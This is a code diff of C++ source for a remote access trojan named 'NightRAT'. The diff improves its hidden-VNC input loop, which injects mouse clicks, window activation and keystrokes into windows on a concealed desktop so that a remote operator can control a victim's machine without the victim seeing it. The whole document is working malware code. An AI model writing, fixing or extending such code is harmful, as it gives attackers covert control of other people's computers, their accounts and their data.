@@ -66,6 +66,8 @@ static wstring g_desktopName = L"NightRAT_HiddenDesktop";
 static mutex g_gdiplusMutex;
 static ULONG_PTR g_gdiplusToken = 0;
 
+static HWND g_hLastInteractedWnd = NULL;
+
 // Input Worker
 struct InputTask {
     string action;
@@ -342,6 +344,8 @@ static void input_loop() {
 
         if (task.action.find("hvnc_mouse") != string::npos) {
             LRESULT hitTest = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(x, y));
+            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+            g_hLastInteractedWnd = hRoot;
 
             if (task.action == "hvnc_mousemove") {
                 PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
@@ -352,7 +356,7 @@ static void input_loop() {
                 WPARAM wParam = 0;
 
                 if (task.action == "hvnc_mousedown") {
-                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                    // Activate Window
                     SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(hitTest, WM_LBUTTONDOWN));
                     SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
                     SetForegroundWindow(hRoot);
@@ -361,7 +365,7 @@ static void input_loop() {
                     if (hitTest != HTCLIENT) {
                         msg = (btn == 0) ? WM_NCLBUTTONDOWN : (btn == 1 ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN);
                         wParam = hitTest;
-                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                        PostMessageW(hRoot, msg, wParam, MAKELPARAM(x, y));
                     } else {
                         HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
                         if (hChild && hChild != hwnd) hwnd = hChild;
@@ -375,7 +379,7 @@ static void input_loop() {
                     if (hitTest != HTCLIENT) {
                         msg = (btn == 0) ? WM_NCLBUTTONUP : (btn == 1 ? WM_NCRBUTTONUP : WM_NCMBUTTONUP);
                         wParam = hitTest;
-                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                        PostMessageW(hRoot, msg, wParam, MAKELPARAM(x, y));
                     } else {
                         HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
                         if (hChild && hChild != hwnd) hwnd = hChild;
@@ -390,15 +394,15 @@ static void input_loop() {
             int vk = task.cmd.value("keycode", 0);
             HWND hFocus = GetFocus();
             if (!hFocus) hFocus = GetForegroundWindow();
-            if (!hFocus) hFocus = hwnd;
+            if (!hFocus) hFocus = g_hLastInteractedWnd;
 
-            if (task.action == "hvnc_keydown") {
-                SendMessageW(hFocus, WM_KEYDOWN, vk, 0);
-                if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) || vk == VK_SPACE || vk == VK_RETURN || vk == VK_BACK) {
+            if (hFocus) {
+                if (task.action == "hvnc_keydown") {
+                    SendMessageW(hFocus, WM_KEYDOWN, vk, 0);
                     SendMessageW(hFocus, WM_CHAR, vk, 0);
+                } else {
+                    SendMessageW(hFocus, WM_KEYUP, vk, 0);
                 }
-            } else {
-                SendMessageW(hFocus, WM_KEYUP, vk, 0);
             }
         }
     }
